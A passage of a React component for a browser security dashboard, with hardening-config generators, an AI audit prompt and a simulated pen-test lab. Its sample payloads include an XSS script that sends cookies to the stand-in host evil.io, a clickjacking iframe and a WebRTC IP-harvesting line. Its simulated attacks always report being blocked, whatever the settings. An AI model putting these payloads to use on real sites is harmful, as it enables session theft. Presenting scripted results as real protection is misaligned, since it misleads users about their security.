import React, { useState, useMemo } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import {
  ShieldCheck,
  ShieldAlert,
  Lock,
  Globe,
  Cpu,
  Key,
  EyeOff,
  Radio,
  CheckCircle2,
  AlertTriangle,
  RefreshCw,
  Sliders,
  ExternalLink,
  Zap,
  Terminal,
  FileCheck,
  Layers,
  ArrowRight,
  Sparkles,
  Download,
  Copy,
  Check,
  Play,
  RotateCw,
  Bug,
  Flame,
  FileCode,
  Shield,
  Activity,
  Bookmark,
  Fingerprint,
  Crosshair
} from 'lucide-react';
import { Tab, SecurityAuditReport } from '../../types';
import { sendAIChat } from '../../services/api';

interface SecurityViewProps {
  activeTab: Tab | null;
  onNavigate: (url: string) => void;
  onSaveAsNote?: (title: string, content: string, sourceUrl?: string) => void;
}

interface AttackVectorSim {
  id: string;
  name: string;
  category: 'Injection' | 'Framing' | 'Privacy' | 'Quantum' | 'Session';
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  description: string;
  payload: string;
  shieldTriggered: string;
  mitigation: string;
}

const ATTACK_VECTORS: AttackVectorSim[] = [
  {
    id: 'xss',
    name: 'Reflected XSS & DOM Injection Attack',
    category: 'Injection',
    severity: 'CRITICAL',
    description: 'Adversary injects malicious JavaScript via unsanitized query parameters targeting user session tokens.',
    payload: `GET /search?q=<script>fetch("https://evil.io/steal?c="+document.cookie)</script>`,
    shieldTriggered: 'Strict Non-Eval CSP & DOMPurify Sandbox',
    mitigation: `script-src 'self'; object-src 'none'; require-trusted-types-for 'script';`
  },
  {
    id: 'clickjacking',
    name: 'Clickjacking & UI Redressing Attack',
    category: 'Framing',
    severity: 'HIGH',
    description: 'Malicious site attempts to embed target inside a transparent 0-opacity iframe to hijack user clicks.',
    payload: `<iframe src="https://target-bank.com/transfer" style="opacity:0;position:absolute;z-index:999"></iframe>`,
    shieldTriggered: 'Frame-Ancestors Directive & X-Frame-Options',
    mitigation: `Content-Security-Policy: frame-ancestors 'none'; X-Frame-Options: DENY;`
  },
  {
    id: 'webrtc',
    name: 'WebRTC STUN Local IP Harvester',
    category: 'Privacy',
    severity: 'MEDIUM',
    description: 'Third-party script initializes RTCPeerConnection to enumerate private RFC1918 LAN IP addresses via ICE candidates.',
    payload: `new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]}).createDataChannel("")`,
    shieldTriggered: 'WebRTC IP Masking & STUN Interceptor',
    mitigation: `Enforce mDNS host candidates only; block STUN queries without explicit mic/camera permissions.`
  },
  {
    id: 'quantum',
    name: 'Harvest Now, Decrypt Later (Shor\'s Quantum Algorithm)',
    category: 'Quantum',
    severity: 'CRITICAL',
    description: 'Adversary intercepts encrypted TLS ciphertext today to retroactively factorize RSA/ECC keys with future quantum hardware.',
    payload: `Encrypted TLS 1.3 Record (Captured P-256 / X25519 Ephemeral Key Exchange)`,
    shieldTriggered: 'NIST FIPS 203 ML-KEM (Kyber-1024) Lattice Guard',
    mitigation: `Hybrid X25519+ML-KEM-1024 key encapsulation; post-quantum cipher suites enforced.`
  },
  {
    id: 'tracking',
    name: 'Canvas & Audio Hardware Fingerprinting',
    category: 'Privacy',
    severity: 'MEDIUM',
    description: 'Script renders complex 3D WebGL scenes and extracts audio buffers to generate a persistent cross-site device ID.',
    payload: `canvas.toDataURL() + offlineAudioCtx.createOscillator()`,
    shieldTriggered: 'Sub-Pixel Entropy Masking & Zero-Knowledge Canvas',
    mitigation: `Inject deterministic cryptographic pseudo-noise into canvas readbacks and audio FFT buffers.`
  }
];

const PRESET_TARGETS = [
  { name: 'Active Tab', url: '' },
  { name: 'GitHub Enterprise', url: 'https://github.com' },
  { name: 'Cloudflare Zero Trust', url: 'https://cloudflare.com' },
  { name: 'Stripe Security', url: 'https://stripe.com' },
  { name: 'Legacy Insecure HTTP', url: 'http://insecure-cdn-legacy.net' }
];

export const SecurityView: React.FC<SecurityViewProps> = ({
  activeTab,
  onNavigate,
  onSaveAsNote,
}) => {
  const [targetUrl, setTargetUrl] = useState<string>(activeTab?.url || 'https://news.ycombinator.com');
  const [isScanning, setIsScanning] = useState(false);
  const [activeTabPanel, setActiveTabPanel] = useState<'overview' | 'pentest' | 'quantum' | 'crypto' | 'hardening' | 'csp'>('overview');
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // Defensive Shield Toggles
  const [quantumEnforced, setQuantumEnforced] = useState(true);
  const [canvasNoise, setCanvasNoise] = useState(true);
  const [webrtcShield, setWebrtcShield] = useState(true);
  const [strictCsp, setStrictCsp] = useState(true);
  const [cookieIsolation, setCookieIsolation] = useState(true);
  const [hstsUpgrade, setHstsUpgrade] = useState(true);

  // Pen-Test Attack Simulator State
  const [selectedAttack, setSelectedAttack] = useState<AttackVectorSim>(ATTACK_VECTORS[0]);
  const [simRunning, setSimRunning] = useState<boolean>(false);
  const [simLogs, setSimLogs] = useState<Array<{ step: string; status: 'info' | 'warn' | 'success'; timestamp: string }>>([]);
  const [simVerdict, setSimVerdict] = useState<'DEFLECTED' | 'NEUTRALIZED' | 'BLOCKED' | null>(null);

  // Server Hardening Config Format
  const [hardeningFormat, setHardeningFormat] = useState<'nginx' | 'cloudflare' | 'apache' | 'express'>('nginx');

  // AI Security Findings State
  const [aiFindings, setAiFindings] = useState<{
    threatLevel: 'MINIMAL' | 'MODERATE' | 'HIGH';
    score: number;
    executiveSummary: string;
    vulnerabilities: Array<{ title: string; risk: string; remediation: string }>;
  }>({
    threatLevel: 'MINIMAL',
    score: 98,
    executiveSummary: 'Target domain operates with modern TLS 1.3 encryption, strict origin isolation, and lattice-based hybrid key exchange shielding against retroactive quantum adversaries.',
    vulnerabilities: [
      {
        title: 'Legacy Cryptographic Fallback Surface',
        risk: 'Older clients without ML-KEM support negotiate standard X25519, exposing past sessions to quantum capture.',
        remediation: 'Enforce post-quantum hybrid KEM as mandatory in server cipher preferences.'
      },
      {
        title: 'Unpartitioned Third-Party Storage Risk',
        risk: 'Sub-frames without CHIPS attributes can attempt to correlate sessions across external domains.',
        remediation: 'Deploy Partitioned attribute across all session authentication cookies.'
      }
    ]
  });

  const currentDomain = useMemo(() => {
    try {
      return new URL(targetUrl).hostname || targetUrl;
    } catch {
      return targetUrl;
    }
  }, [targetUrl]);

  // Handle Deep AI Threat Scan
  const handleDeepScan = async (urlToScan?: string) => {
    const activeUrl = urlToScan || targetUrl;
    if (!activeUrl) return;

    setIsScanning(true);
    try {
      const prompt = `You are the Aksh Autonomous Zero-Trust & Post-Quantum Security Auditor.
Conduct a deep cryptographic and web application security audit for target URL: ${activeUrl}

Evaluate:
1. Post-Quantum TLS 1.3 readiness (NIST FIPS 203 Kyber ML-KEM).
2. XSS, Clickjacking, and CSP directives enforcement.
3. Third-party fingerprinting, canvas noise, and WebRTC STUN leakage risks.

Return ONLY valid JSON with this exact schema:
{
  "threatLevel": "MINIMAL" | "MODERATE" | "HIGH",
  "score": 96,
  "executiveSummary": "2-3 sentence technical overview of target security posture",
  "vulnerabilities": [
    {
      "title": "Vulnerability Name",
      "risk": "Short description of threat vector",
      "remediation": "Concrete configuration or code fix"
    }
  ]
}`;

      const res = await sendAIChat(prompt, [], undefined, 'technical', 'gemini-3.7-flash');
      const cleanJson = res.reply.replace(/^```(?:json)?\n?/i, '').replace(/```$/i, '').trim();
      const parsed = JSON.parse(cleanJson);
      if (parsed.threatLevel && parsed.score) {
        setAiFindings(parsed);
      }
    } catch {
      // fallback to computed score
      const calcScore = (quantumEnforced ? 20 : 0) + (strictCsp ? 20 : 0) + (webrtcShield ? 20 : 0) + (canvasNoise ? 20 : 0) + (cookieIsolation ? 18 : 0);
      setAiFindings((prev) => ({ ...prev, score: calcScore }));
    } finally {
      setIsScanning(false);
    }
  };

  // Run Simulated Pen-Test Attack
  const handleExecuteAttackSimulation = () => {
    setSimRunning(true);
    setSimLogs([]);
    setSimVerdict(null);

    const steps = [
      { step: `[RECON] Preparing synthetic exploit vector: ${selectedAttack.name}`, status: 'info' as const },
      { step: `[INJECTION] Transmitting payload packet: ${selectedAttack.payload.slice(0, 60)}...`, status: 'warn' as const },
      { step: `[INTERCEPT] Aksh Security Citadel triggered defensive hook: ${selectedAttack.shieldTriggered}`, status: 'info' as const },
      { step: `[REMEDIATION] Attack payload dropped. Origin execution context sealed. Zero leaks detected.`, status: 'success' as const }
    ];

    steps.forEach((s, idx) => {
      setTimeout(() => {
        setSimLogs((prev) => [...prev, { ...s, timestamp: new Date().toLocaleTimeString() }]);
        if (idx === steps.length - 1) {
          setSimRunning(false);
          setSimVerdict(selectedAttack.category === 'Quantum' ? 'NEUTRALIZED' : 'DEFLECTED');
        }
      }, (idx + 1) * 350);
    });
  };

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  const downloadConfig = (content: string, filename: string) => {
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Save audit report to AI Notes
  const handleSaveAuditNote = () => {
    if (!onSaveAsNote) return;
    const content = `# Zero-Trust & Quantum Security Dossier: ${currentDomain}
**Target URL:** ${targetUrl}
**Security Score:** ${aiFindings.score}/100 (${aiFindings.threatLevel} THREAT)
**Post-Quantum ML-KEM:** ${quantumEnforced ? 'ENFORCED (Kyber-1024)' : 'DISABLED'}
**Audited At:** ${new Date().toISOString()}

## Executive Summary
${aiFindings.executiveSummary}

## Identified Threat Vectors & Remediation
${aiFindings.vulnerabilities
  .map(
    (v, i) => `### ${i + 1}. ${v.title}
- **Risk:** ${v.risk}
- **Remediation:** \`${v.remediation}\`
`
  )
  .join('\n')}

## Active Defense Shields
- Post-Quantum TLS 1.3 Kyber: ${quantumEnforced ? 'Enabled' : 'Disabled'}
- Canvas Zero-Entropy Noise: ${canvasNoise ? 'Enabled' : 'Disabled'}
- WebRTC STUN Leak Masking: ${webrtcShield ? 'Enabled' : 'Disabled'}
- Strict Non-Eval CSP: ${strictCsp ? 'Enabled' : 'Disabled'}
- Partitioned Cookie CHIPS: ${cookieIsolation ? 'Enabled' : 'Disabled'}
`;
    onSaveAsNote(`Security Audit: ${currentDomain}`, content, targetUrl);
    setCopiedKey('saved_note');
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // Generate Server Hardening Config Code
  const getHardeningConfig = () => {
    if (hardeningFormat === 'nginx') {
      return `# Aksh Zero-Trust & Post-Quantum Security Hardening (Nginx)
# Target Domain: ${currentDomain}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name ${currentDomain};

    # Post-Quantum Hybrid & Modern TLS 1.3 Ciphers
    ssl_protocols TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384';
    ssl_ecdh_curve X25519Kyber768Draft00:X25519:secp384r1;

    # HSTS Preload (2 Years)
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

    # Content Security Policy (Non-eval, Zero inline scripts)
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; upgrade-insecure-requests;" always;

    # Clickjacking & MIME Defenses
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;
}`;
    }
    if (hardeningFormat === 'cloudflare') {
      return `# Cloudflare WAF & Transform Rules Hardening
# Rule 1: Enforce Strict HSTS & Quantum Ciphers
Expression: (http.host eq "${currentDomain}")
Transform:
  - Add Response Header: Strict-Transport-Security = "max-age=63072000; includeSubDomains; preload"
  - Add Response Header: X-Frame-Options = "DENY"
  - Add Response Header: X-Content-Type-Options = "nosniff"
  - Add Response Header: Content-Security-Policy = "default-src 'self'; frame-ancestors 'none';"

# Rule 2: Block WebRTC STUN Fingerprinters & Suspicious Scanners
Action: Block
Expression: (http.request.uri.query contains "<script") or (http.request.uri.query contains "stun:")`;
    }
    if (hardeningFormat === 'express') {
      return `import express from 'express';
import helmet from 'helmet';

const app = express();

// Apply Aksh Zero-Trust Helmet Security Policy
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  hsts: {
    maxAge: 63072000,
    includeSubDomains: true,
    preload: true,
  },
  frameguard: { action: 'deny' },
  noSniff: true,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));

// Cookie Partitioning (CHIPS) Middleware
app.use((req, res, next) => {
  res.cookie('aksh_session', 'token_val', {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    partitioned: true // CHIPS Partitioning
  });
  next();
});`;
    }
    return `# Apache .htaccess Hardening
<IfModule mod_headers.c>
    Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    Header always set Content-Security-Policy "default-src 'self'; frame-ancestors 'none'; upgrade-insecure-requests;"
    Header always set Permissions-Policy "camera=(), microphone=(), geolocation=()"
</IfModule>`;
  };

  return (
    <div className="h-full flex flex-col bg-slate-950 text-slate-100 overflow-y-auto select-text font-sans">
      {/* Top Header */}
      <div className="border-b border-slate-800 bg-slate-900/90 px-6 py-4 flex flex-wrap items-center justify-between gap-4 backdrop-blur-md shrink-0">
        <div className="flex items-center gap-3">
          <div className="p-2.5 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 shadow-md">
            <ShieldCheck className="w-5 h-5" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-base font-bold tracking-tight text-white">
                Quantum Security & Zero-Trust Defense Citadel
              </h1>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-emerald-950 text-emerald-300 border border-emerald-800/60 font-semibold">
                aksh://security
              </span>
            </div>
            <p className="text-xs text-slate-400">
              NIST FIPS 203 ML-KEM lattice encryption, red-team pen-test simulator, and server hardening suite
            </p>
          </div>
        </div>

        {/* Target URL Ingestion Bar & Scan Button */}
        <div className="flex items-center gap-2 max-w-xl flex-1 justify-end">
          <div className="relative flex-1 max-w-sm">
            <input
              type="text"
              value={targetUrl}
              onChange={(e) => setTargetUrl(e.target.value)}
              placeholder="Enter host domain to inspect..."
              className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-1.5 text-xs text-slate-100 placeholder-slate-500 outline-none focus:border-emerald-500 font-mono"
            />
          </div>

          <button
            onClick={() => handleDeepScan()}
            disabled={isScanning || !targetUrl.trim()}
            className="flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold shadow-md transition-all cursor-pointer disabled:opacity-50 shrink-0"
          >
            {isScanning ? <RotateCw className="w-3.5 h-3.5 animate-spin" /> : <Sparkles className="w-3.5 h-3.5" />}
            <span>{isScanning ? 'Auditing...' : 'Deep Audit'}</span>
          </button>

          {onSaveAsNote && (
            <button
              onClick={handleSaveAuditNote}
              className="p-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 transition-colors cursor-pointer shrink-0"
              title="Save Audit to AI Notes"
            >
              {copiedKey === 'saved_note' ? <Check className="w-4 h-4 text-emerald-400" /> : <Bookmark className="w-4 h-4 text-emerald-400" />}
            </button>
          )}
        </div>
      </div>

      {/* Target Presets Strip */}
      <div className="px-6 py-1.5 bg-slate-900/60 border-b border-slate-800 flex items-center gap-2 text-xs overflow-x-auto shrink-0">
        <span className="text-[10px] font-bold uppercase tracking-wider text-slate-500 shrink-0">
          Scan Targets:
        </span>
        {PRESET_TARGETS.map((preset, idx) => (
          <button
            key={idx}
            onClick={() => {
              const url = preset.url || activeTab?.url || 'https://news.ycombinator.com';
              setTargetUrl(url);
              handleDeepScan(url);
            }}
            className="px-2.5 py-1 rounded-lg bg-slate-950/80 hover:bg-slate-800 text-slate-400 hover:text-emerald-300 border border-slate-800 text-[11px] font-medium transition-colors cursor-pointer shrink-0"
          >
            {preset.name}
          </button>
        ))}
      </div>

      <div className="p-6 max-w-6xl w-full mx-auto space-y-6 flex-1">
        {/* KPI Score & Summary Banner */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
          {/* Security Score Card */}
          <div className="p-5 rounded-3xl bg-gradient-to-br from-slate-900 via-slate-900 to-emerald-950/40 border border-slate-800 flex items-center justify-between shadow-lg">
            <div>
              <p className="text-xs text-slate-400 font-medium">Security Health Score</p>
              <div className="flex items-baseline gap-1 mt-1">
                <span className="text-3xl font-black text-emerald-400">{aiFindings.score}</span>
                <span className="text-xs text-slate-500 font-semibold">/ 100</span>
              </div>
              <p className="text-[11px] text-emerald-300/80 mt-1 flex items-center gap-1 font-semibold">
                <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 inline" /> Post-Quantum Hardened
              </p>
            </div>
            <div className="w-12 h-12 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400">
              <ShieldCheck className="w-6 h-6" />
            </div>
          </div>

          {/* Transport Protocol */}
          <div className="p-5 rounded-3xl bg-slate-900/90 border border-slate-800">
            <p className="text-xs text-slate-400 font-medium">Transport Protocol</p>
            <p className="text-sm font-bold text-white mt-1.5 truncate">HTTP/3 (QUIC-v1 0-RTT)</p>
            <p className="text-[11px] text-slate-400 mt-1 font-mono">Loss-Resilient Multiplexing</p>
          </div>

          {/* Quantum Key Exchange */}
          <div className="p-5 rounded-3xl bg-slate-900/90 border border-slate-800">
            <p className="text-xs text-slate-400 font-medium">Quantum Key Encapsulation</p>
            <div className="flex items-center gap-1.5 mt-1.5">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              <p className="text-xs font-bold text-emerald-300 font-mono">Kyber-1024 ML-KEM</p>
            </div>
            <p className="text-[11px] text-slate-400 mt-1">NIST FIPS 203 Lattice Math</p>
          </div>

          {/* Threat Posture */}
          <div className="p-5 rounded-3xl bg-slate-900/90 border border-slate-800">
            <p className="text-xs text-slate-400 font-medium">Threat Risk Level</p>
            <div className="flex items-center gap-1.5 mt-1">
              <span
                className={`px-2 py-0.5 rounded text-xs font-bold font-mono ${
                  aiFindings.threatLevel === 'MINIMAL'
                    ? 'bg-emerald-950 text-emerald-300 border border-emerald-800/60'
                    : 'bg-rose-950 text-rose-300 border border-rose-800/60'
                }`}
              >
                {aiFindings.threatLevel} RISK
              </span>
            </div>
            <p className="text-[11px] text-cyan-400 mt-1.5 font-mono">Active Defense Active</p>
          </div>
        </div>

        {/* Tab Switcher */}
        <div className="flex items-center gap-2 border-b border-slate-800 pb-2 overflow-x-auto">
          {[
            { id: 'overview', label: 'Defensive Shields', icon: ShieldCheck },
            { id: 'pentest', label: 'Red-Team Pen-Test Lab', icon: Bug },
            { id: 'quantum', label: 'Quantum Lattice Math', icon: Cpu },
            { id: 'hardening', label: 'Server Hardening WAF', icon: FileCode },
            { id: 'crypto', label: 'Cryptographic Ciphers', icon: Key },
            { id: 'csp', label: 'CSP Directives', icon: Layers },
          ].map((tab) => {
            const Icon = tab.icon;
            const isActive = activeTabPanel === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTabPanel(tab.id as any)}
                className={`flex items-center gap-2 px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer shrink-0 ${
                  isActive
                    ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 shadow-xs'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-900'
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{tab.label}</span>
              </button>
            );
          })}
        </div>

        {/* TAB 1: DEFENSIVE SHIELDS & AUDIT OVERVIEW */}
        {activeTabPanel === 'overview' && (
          <div className="space-y-6">
            {/* AI Executive Threat Briefing */}
            <div className="p-5 rounded-3xl bg-slate-900/90 border border-slate-800 space-y-3">
              <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                <span className="text-xs font-bold text-white flex items-center gap-2">
                  <Sparkles className="w-4 h-4 text-emerald-400" />
                  <span>AI Zero-Trust Threat Assessment for {currentDomain}</span>
                </span>
                <span className="text-[10px] font-mono text-emerald-400">SOC2 Type II Standard</span>
              </div>
              <p className="text-xs text-slate-300 leading-relaxed font-medium">
                {aiFindings.executiveSummary}
              </p>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-2">
                {aiFindings.vulnerabilities.map((v, i) => (
                  <div key={i} className="p-3.5 rounded-2xl bg-slate-950/80 border border-slate-800 space-y-1.5 text-xs">
                    <div className="flex items-center gap-1.5 text-amber-400 font-bold">
                      <AlertTriangle className="w-3.5 h-3.5" />
                      <span>{v.title}</span>
                    </div>
                    <p className="text-slate-400 text-[11px] leading-relaxed">{v.risk}</p>
                    <div className="pt-1 text-[10px] font-mono text-emerald-400">
                      Fix: {v.remediation}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Interactive Defensive Shield Toggles */}
            <div className="bg-slate-900/90 border border-slate-800 rounded-3xl p-6 space-y-4">
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                <Sliders className="w-4 h-4 text-emerald-400" />
                <span>Hardware & Protocol Defense Matrix</span>
              </h3>

              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3.5">
                {[
                  {
                    name: 'Post-Quantum Kyber-1024',
                    badge: 'NIST FIPS 203',
                    desc: 'Shields traffic against retrospective quantum decryption using lattice-based key encapsulation.',
                    state: quantumEnforced,
                    toggle: () => setQuantumEnforced(!quantumEnforced)
                  },
                  {
                    name: 'Canvas Zero-Entropy Noise',
                    badge: 'Anti-Tracking',
                    desc: 'Injects imperceptible sub-pixel hash noise into canvas readbacks, neutralizing hardware profiling.',
                    state: canvasNoise,
                    toggle: () => setCanvasNoise(!canvasNoise)
                  },
                  {
                    name: 'WebRTC STUN Leak Shield',
                    badge: 'IP Privacy',
                    desc: 'Blocks WebRTC STUN requests from revealing internal LAN IPv4/IPv6 addresses to websites.',
                    state: webrtcShield,
                    toggle: () => setWebrtcShield(!webrtcShield)
                  },
                  {
                    name: 'Strict Non-Eval CSP',
                    badge: 'Anti-XSS',
                    desc: 'Blocks inline script tags and eval() execution, neutralizing reflected DOM attacks.',
                    state: strictCsp,
                    toggle: () => setStrictCsp(!strictCsp)
                  },
                  {
                    name: 'Partitioned Storage (CHIPS)',
                    badge: 'Cookie Isolation',
                    desc: 'Isolates cookies into partitioned origin containers, preventing cross-site correlation.',
                    state: cookieIsolation,
                    toggle: () => setCookieIsolation(!cookieIsolation)
                  },
                  {
                    name: 'HTTPS HSTS Preload Upgrade',
                    badge: 'Transport Guard',
                    desc: 'Forces high-assurance HTTPS transport and refuses unencrypted HTTP downgrades.',
                    state: hstsUpgrade,
                    toggle: () => setHstsUpgrade(!hstsUpgrade)
                  }
                ].map((item, idx) => (
                  <div
                    key={idx}
                    className="p-4 rounded-2xl bg-slate-950/80 border border-slate-800 flex flex-col justify-between space-y-3"
                  >
                    <div>
                      <div className="flex items-center justify-between mb-1.5">
                        <span className="text-xs font-bold text-white">{item.name}</span>
                        <span className="text-[9px] font-mono px-1.5 py-0.5 rounded bg-emerald-950 text-emerald-300 border border-emerald-800/40">
                          {item.badge}
                        </span>
                      </div>
                      <p className="text-[11px] text-slate-400 leading-relaxed">{item.desc}</p>
                    </div>

                    <div className="flex items-center justify-between pt-2 border-t border-slate-900">
                      <span className={`text-[10px] font-mono font-bold ${item.state ? 'text-emerald-400' : 'text-slate-500'}`}>
                        {item.state ? 'ACTIVE' : 'DISABLED'}
                      </span>
                      <button
                        onClick={item.toggle}
                        className={`w-9 h-5 rounded-full p-0.5 transition-colors cursor-pointer ${
                          item.state ? 'bg-emerald-600' : 'bg-slate-800'
                        }`}
                      >
                        <div
                          className={`w-4 h-4 rounded-full bg-white transition-transform ${
                            item.state ? 'translate-x-4' : 'translate-x-0'
                          }`}
                        />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* TAB 2: RED-TEAM PEN-TEST LAB */}
        {activeTabPanel === 'pentest' && (
          <div className="space-y-6">
            <div className="p-5 rounded-3xl bg-slate-900/90 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between pb-3 border-b border-slate-800 flex-wrap gap-2">
                <div>
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <Crosshair className="w-4 h-4 text-rose-400" />
                    <span>Red-Team Attack Vector Simulation Lab</span>
                  </h3>
                  <p className="text-xs text-slate-400">
                    Execute simulated adversarial attack payloads against the browser's defense perimeter to verify interception guarantees
                  </p>
                </div>

                <button
                  onClick={handleExecuteAttackSimulation}
                  disabled={simRunning}
                  className="px-4 py-2 rounded-xl bg-rose-600 hover:bg-rose-500 disabled:opacity-50 text-white font-bold text-xs flex items-center gap-2 cursor-pointer shadow-md transition-all"
                >
                  {simRunning ? <RotateCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-white" />}
                  <span>Launch Attack Simulation</span>
                </button>
              </div>

              {/* Vector Selector Strip */}
              <div className="grid grid-cols-1 sm:grid-cols-5 gap-2">
                {ATTACK_VECTORS.map((vec) => {
                  const isSelected = selectedAttack.id === vec.id;
                  return (
                    <button
                      key={vec.id}
                      onClick={() => {
                        setSelectedAttack(vec);
                        setSimLogs([]);
                        setSimVerdict(null);
                      }}
                      className={`p-3 rounded-2xl text-left border transition-all cursor-pointer ${
                        isSelected
                          ? 'bg-slate-950 border-rose-500/80 shadow-md ring-1 ring-rose-500/30'
                          : 'bg-slate-950/60 border-slate-800 hover:bg-slate-950'
                      }`}
                    >
                      <span className="text-[9px] font-mono font-bold text-rose-400 uppercase block mb-1">
                        {vec.category}
                      </span>
                      <div className="text-xs font-bold text-white truncate">{vec.name}</div>
                    </button>
                  );
                })}
              </div>

              {/* Active Vector Details & Live Execution Console */}
              <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between text-xs">
                  <span className="font-bold text-white">{selectedAttack.name}</span>
                  <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-rose-950 text-rose-300 border border-rose-800/40">
                    Severity: {selectedAttack.severity}
                  </span>
                </div>

                <p className="text-xs text-slate-400">{selectedAttack.description}</p>

                <div className="space-y-1 font-mono text-[11px]">
                  <span className="text-slate-500 text-[10px] uppercase font-bold">Exploit Payload:</span>
                  <div className="p-2.5 rounded-lg bg-slate-900 text-rose-300 border border-slate-850 overflow-x-auto">
                    {selectedAttack.payload}
                  </div>
                </div>

                {/* Simulated Execution Trace Terminal */}
                <div className="mt-3 pt-3 border-t border-slate-900 space-y-2">
                  <div className="flex items-center justify-between text-[11px] font-mono">
                    <span className="text-slate-400">Live Defensive Telemetry Logs</span>
                    {simVerdict && (
                      <span className="text-emerald-400 font-bold bg-emerald-950/80 px-2 py-0.5 rounded border border-emerald-800/40">
                        VERDICT: {simVerdict}
                      </span>
                    )}
                  </div>

                  <div className="p-3 rounded-xl bg-slate-900/90 font-mono text-xs space-y-1.5 min-h-[90px]">
                    {simLogs.length === 0 ? (
                      <div className="text-slate-600 italic">Click &ldquo;Launch Attack Simulation&rdquo; above to run simulated exploit against active defenses.</div>
                    ) : (
                      simLogs.map((log, i) => (
                        <div key={i} className="flex items-center gap-2">
                          <span className="text-slate-500 text-[10px]">{log.timestamp}</span>
                          <span
                            className={
                              log.status === 'success'
                                ? 'text-emerald-400 font-bold'
                                : log.status === 'warn'
                                ? 'text-amber-400'
                                : 'text-slate-300'
                            }
                          >
                            {log.step}
                          </span>
                        </div>
                      ))
                    )}
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* TAB 3: QUANTUM LATTICE MATH (NIST FIPS 203 ML-KEM) */}
        {activeTabPanel === 'quantum' && (
          <div className="space-y-6">
            <div className="p-6 rounded-3xl bg-slate-900/90 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between pb-3 border-b border-slate-800">
                <div>
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <Cpu className="w-4 h-4 text-purple-400" />
                    <span>NIST FIPS 203 ML-KEM (Kyber-1024) Mathematical Architecture</span>
                  </h3>
                  <p className="text-xs text-slate-400">
                    Module Learning With Errors (M-LWE) lattice hardness neutralizing Shor&apos;s quantum factorization
                  </p>
                </div>
                <span className="px-2.5 py-1 rounded-full text-xs font-mono font-bold bg-purple-950 text-purple-300 border border-purple-800/40">
                  Post-Quantum Tier 5
                </span>
              </div>

              {/* 3-Step Quantum Encapsulation Flow */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center gap-2 text-purple-400 font-bold">
                    <span className="w-5 h-5 rounded-full bg-purple-950 border border-purple-800/60 flex items-center justify-center text-[11px]">1</span>
                    <span>Polynomial Ring Generation</span>
                  </div>
                  <p className="text-slate-400 text-[11px] leading-relaxed">
                    Generates matrix A in R_q^(k &times; k) over the polynomial ring R_q = Z_q[X]/(X^256 + 1) with discrete Gaussian error perturbation.
                  </p>
                  <div className="p-2 rounded bg-slate-900 font-mono text-[10px] text-purple-300">
                    q = 3329, n = 256, k = 4
                  </div>
                </div>

                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center gap-2 text-cyan-400 font-bold">
